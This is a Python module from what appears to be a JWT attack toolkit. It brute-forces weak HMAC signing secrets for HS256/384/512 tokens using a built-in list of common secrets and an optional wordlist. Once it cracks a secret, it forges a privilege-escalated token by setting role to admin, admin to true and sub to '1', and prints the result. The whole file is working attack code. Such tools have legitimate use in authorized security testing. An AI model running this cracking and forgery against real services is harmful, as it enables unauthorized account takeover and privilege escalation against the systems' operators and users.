"""
Attack 3: Weak Secret Bruteforce (HS256/384/512)
-------------------------------------------------
Tries wordlist entries as HMAC secrets to crack the JWT signature.
Supports HS256, HS384, HS512.
Multithreaded for speed.
"""

import hmac
import hashlib
import base64
import json
import os
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from .utils import decode_token, b64url_decode, b64url_encode


# Built-in mini wordlist for quick wins
DEFAULT_SECRETS = [
    "secret", "password", "123456", "qwerty", "letmein",
    "jwt_secret", "jwtsecret", "supersecret", "changeme",
    "mysecret", "topsecret", "secretkey", "privatekey",
    "key", "pass", "test", "dev", "prod", "admin",
    "password123", "secret123", "jwt", "token", "auth",
    "hs256", "hs512", "signing_key", "signingkey",
    "your-256-bit-secret", "your-secret", "your_secret",
    "access_token_secret", "refresh_token_secret",
    "", "null", "undefined", "none", "true", "false"
]

HASH_MAP = {
    "HS256": hashlib.sha256,
    "HS384": hashlib.sha384,
    "HS512": hashlib.sha512,
}


def _verify_secret(signing_input: bytes, expected_sig: bytes,
                   secret: str, alg: str) -> bool:
    hash_func = HASH_MAP.get(alg.upper())
    if not hash_func:
        return False
    try:
        computed = hmac.new(secret.encode("utf-8", errors="replace"),
                             signing_input, hash_func).digest()
        return hmac.compare_digest(computed, expected_sig)
    except Exception:
        return False


def bruteforce(token: str, wordlist_path: str = None,
               extra_secrets: list = None, threads: int = 8,
               verbose: bool = True) -> dict:
    """
    Bruteforce HMAC JWT secret.
    
    Returns dict with found secret and forged token capability, or empty dict.
    """
    header, payload, signature, parts = decode_token(token)
    alg = header.get("alg", "HS256").upper()

    if alg not in HASH_MAP:
        print(f"  [!] Algorithm {alg} is not an HMAC algorithm — skipping bruteforce")
        return {}

    signing_input = f"{parts[0]}.{parts[1]}".encode()

    # Build candidate list
    candidates = list(DEFAULT_SECRETS)
    if extra_secrets:
        candidates = extra_secrets + candidates

    # Load wordlist
    if wordlist_path:
        if not os.path.exists(wordlist_path):
            print(f"  [!] Wordlist not found: {wordlist_path}")
        else:
            with open(wordlist_path, "r", encoding="utf-8", errors="replace") as f:
                file_secrets = [line.rstrip("\n") for line in f]
            candidates = file_secrets + [s for s in candidates if s not in file_secrets]

    total = len(candidates)
    if verbose:
        print(f"\n[*] WEAK SECRET BRUTEFORCE — {total} candidates, {threads} threads, alg={alg}\n")

    found = {}
    checked = 0

    def check(secret):
        return secret, _verify_secret(signing_input, signature, secret, alg)

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(check, s): s for s in candidates}
        for future in as_completed(futures):
            secret, matched = future.result()
            checked += 1

            if verbose and checked % 500 == 0:
                pct = (checked / total) * 100
                sys.stdout.write(f"\r  [~] Progress: {checked}/{total} ({pct:.1f}%)")
                sys.stdout.flush()

            if matched:
                # Cancel remaining
                for f in futures:
                    f.cancel()
                found = {"secret": secret, "alg": alg}
                break

    if verbose:
        print()  # newline after progress

    if found:
        if verbose:
            print(f"\n  [!!!] SECRET FOUND: '{found['secret']}'\n")
            print(f"  [+] You can now forge arbitrary tokens signed with HS256")
            print(f"  [+] Example — forge admin token:")
            _show_forge_example(header, payload, found["secret"])
    else:
        if verbose:
            print(f"\n  [-] Secret not found in {total} candidates")
            print(f"  [*] Try a larger wordlist: rockyou.txt or jwt-secrets.txt\n")

    return found


def _show_forge_example(header: dict, payload: dict, secret: str):
    """Show a quick example of token forgery with found secret."""
    from .utils import sign_hs256
    forged_payload = dict(payload)
    # Common privilege escalation examples
    if "role" in forged_payload:
        forged_payload["role"] = "admin"
    if "admin" in forged_payload:
        forged_payload["admin"] = True
    if "sub" in forged_payload:
        original_sub = forged_payload["sub"]
        forged_payload["sub"] = "1"  # common admin ID

    forged_header = dict(header)
    forged_header["alg"] = "HS256"
    forged = sign_hs256(forged_header, forged_payload, secret)
    print(f"\n  [FORGED] {forged}\n")


def run(token: str, wordlist: str = None, secrets: list = None,
        threads: int = 8, verbose: bool = True) -> dict:
    return bruteforce(token, wordlist_path=wordlist, extra_secrets=secrets,
                      threads=threads, verbose=verbose)
